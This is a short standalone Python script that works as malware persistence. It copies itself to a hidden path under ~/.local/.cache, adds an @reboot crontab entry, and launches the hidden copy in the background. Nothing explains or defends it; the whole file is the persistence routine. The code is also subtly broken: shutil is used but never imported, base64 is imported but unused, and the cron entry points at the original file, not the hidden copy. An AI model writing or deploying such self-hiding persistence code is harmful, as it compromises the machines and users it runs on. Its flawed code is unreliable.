import os
import sys
import base64

def inject_cronjob():
    cron_entry = "@reboot python3 {} &\n".format(os.path.realpath(__file__))
    os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')

def hide_payload():
    hidden_path = os.path.expanduser("~/.local/.cache/.sess_payload.py")
    if not os.path.exists(hidden_path):
        shutil.copy2(sys.argv[0], hidden_path)
    return hidden_path

def run():
    hidden = hide_payload()
    inject_cronjob()
    os.system(f"python3 {hidden} &")

if __name__ == "__main__":
    run()
